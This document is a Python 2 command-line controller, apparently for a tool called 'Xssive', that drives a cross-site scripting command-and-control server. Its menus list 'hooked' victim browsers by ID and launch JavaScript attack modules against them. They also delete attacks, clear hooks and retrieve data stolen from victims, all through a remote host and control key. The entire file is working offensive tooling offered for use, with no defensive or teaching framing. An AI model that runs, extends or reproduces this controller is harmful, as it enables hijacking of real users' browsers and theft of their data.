import os, sys
import urllib2
import json
import argparse

#-----This is the Controlling Device.---------
class ControlDevice:
	#Initialise data and make our needed urls.
	def __init__(self, host, key):
		self.receive_addr = host+'/Data/'+key
		self.send_addr = host+'/Command/'+key

	#Send a command to the server.
	def send_Command(self, cmd, module, vicid):
		s_data = dict()
		s_data['command']=cmd
		s_data['module']=module
		s_data['victimid']=vicid
		send_data = json.dumps(s_data)
		if cmd=='Launch' or cmd=='Delete' or cmd=='List_Mod' or 'Clear':
			request = urllib2.Request(self.send_addr, send_data,
				{'Content-Type': 'application/json'})
			post = urllib2.urlopen(request)
			js = str(post.read())
			result = json.loads(js)
			post.close()
			return result
	
	#Return a list of available modules
	def pull_Modules(self):
		mod_list = []
		mods = self.send_Command('List_Mod','alert.js',1)
		for i in range(0,len(mods['modules'])):
			mod_list.append(str(mods['modules'][i]['name']))
		return mod_list			

	#Pull attack information.
	def pull_Info(self):
		get = urllib2.urlopen(self.receive_addr)
		result = json.loads(get.read())
		get.close()
		return result

	#Get Attack Data
	def pull_Attack(self):
		att_data = []
		data = self.pull_Info()
		
		for i in data['attack']:
			try:
				att_data.append('\033[37m'+str(i['victimid'])+' | '+i['module']+'\033[0m: '+str(i['data']))
			except:
				print 'No Data returned';
		return att_data
		

	#Return Hooked victims in a list.
	def pull_Hooked(self):
		hooked_list = []
		data = self.pull_Info()
		for i in range(0,len(data['hooked'])):
			hooked_list.append(str(data['hooked'][i]['victimid']))
		return hooked_list

	#Clear Hooks
	def send_Clear(self):
		self.send_Command('Clear','clear',1)
			

#------Main Program-------
att_his = []

running = True
head = "\033[34mSimple Xssive Control Device.\n---------------------------\n\033[0m"
menu = "1. Launch Attack\n2. Delete Attack\n3. View Attack History\n4. View Attack Data\n5. Clear Hooks\n0. Exit\n"

p = argparse.ArgumentParser(description='Xssive Control Device.')
p.add_argument('-H', dest='HOST',type=str, help='Specify The Xssive'+
		' Proxy server Host address.')
p.add_argument('-K', dest='KEY', type=str, help='Control Key.')
args = p.parse_args()

#If required data is present
if args.HOST != None and args.KEY != None:
	my_dev = ControlDevice(args.HOST, args.KEY)
	while(running):
		os.system('clear')
		
		#Selecting a main choice.
		print head+menu
		choice = input('\033[37mPlease select a Number: \033[0m')
		
		#---------Launch An Attack----------
		if choice == 1:
			module_choice = -1
			
			#Selecting a module
			while (module_choice!=0):
				os.system('clear')
				print "\033[34mSelect a Module \n------\033[0m"
				modules = my_dev.pull_Modules() 
				for i in range(0,len(modules)):
					print str(i+1)+'. '+modules[i]
				print '0. Go Back\n'
				module_choice = input('\033[37mEnter your choice: \033[0m')
				victim_choice = -1
				if module_choice != 0:
					while(victim_choice != 0):
						
						#Choosing victimids
						os.system('clear')
						victims = my_dev.pull_Hooked()
						print "\033[34mSelect a VictimID \n------\033[0m"
						for i in victims:
							print str(i)+'. Victim '+str(i)
						print '0. Go Back\n'
						victim_choice = input('\033[37mEnter your Choice : \033[0m')
						if victim_choice != 0:
							result = my_dev.send_Command('Launch',
								modules[module_choice-1], 
								int(victims[victim_choice-1]))
							attres = 'Launch|'+modules[module_choice-1]+'|'+str(victims[victim_choice-1])+' RESULT = \033[32m'+str(result)+'\033[0m'
							att_his.append(attres)
							print attres
							nothing = raw_input("Press Enter to continue...")
							victim_choice= 0
						else:
							victim_choice = -1
							module_choice = -1
							break
				else:
					module_choice = -1
					break
		
		#-----Delete an entry------	
		if choice == 2:
			module_choice = -1
			
			#Selecting a module to delete
			while(module_choice!=0):
				os.system('clear')
				print "\033[34mSelect a Module \n------\033[0m"
				modules = my_dev.pull_Modules()
				modules.append('all')
				for i in range(0,len(modules)):
					print str(i+1)+'. '+modules[i]
				print '0. Go Back\n'
				module_choice = input('\033[37mEnter your choice: \033[0m')
				victim_choice = -1
				if module_choice != 0:
					while(victim_choice != 0):
						#Choosing victimids
						os.system('clear')
						victims = my_dev.pull_Hooked()
						print "\033[34mSelect a VictimID \n------\033[0m"
						for i in victims:
							print str(i)+'. Victim '+str(i)
						print '0. Go Back\n'
						victim_choice = input('\033[37mEnter your Choice : \033[0m')
						if victim_choice != 0:
							print 'Delete'+modules[module_choice-1]+str(victims[victim_choice-1])
							result = my_dev.send_Command('Delete',
								modules[module_choice-1],
								int(victims[victim_choice-1]))
							print '\033[32m'+str(result)+'\033[0m'
							nothing = raw_input("Press Enter to continue...")

							victim_choice = 0
						else:
							victim_choice = -1
							module_choice = 0
							break
				else:
					module_choice = -1
					break

		#----------Display Running History-------
		if choice == 3:
			os.system('clear')
			for i in att_his:
				print i
			n = raw_input("Press Enter to continue...")
			print ''
		

		#----------View Retrieved Attack Data---------
		if choice == 4:
			os.system('clear')
			attack_data = my_dev.pull_Attack()
			for i in attack_data:
				print i
			n = raw_input("Press Enter to continue...")
			print ''	
	
		#-----------Clear Hooks/Unhook--------------
		if choice == 5:
			my_dev.send_Clear()
			os.system('clear')
			print 'Hooks Cleared!'
			n = raw_input("Press Enter to continue...")
			print ''

		#--------Exit------------
		if choice == 0:
			sys.exit()

else:
	print 'No Host or Key Specified!'

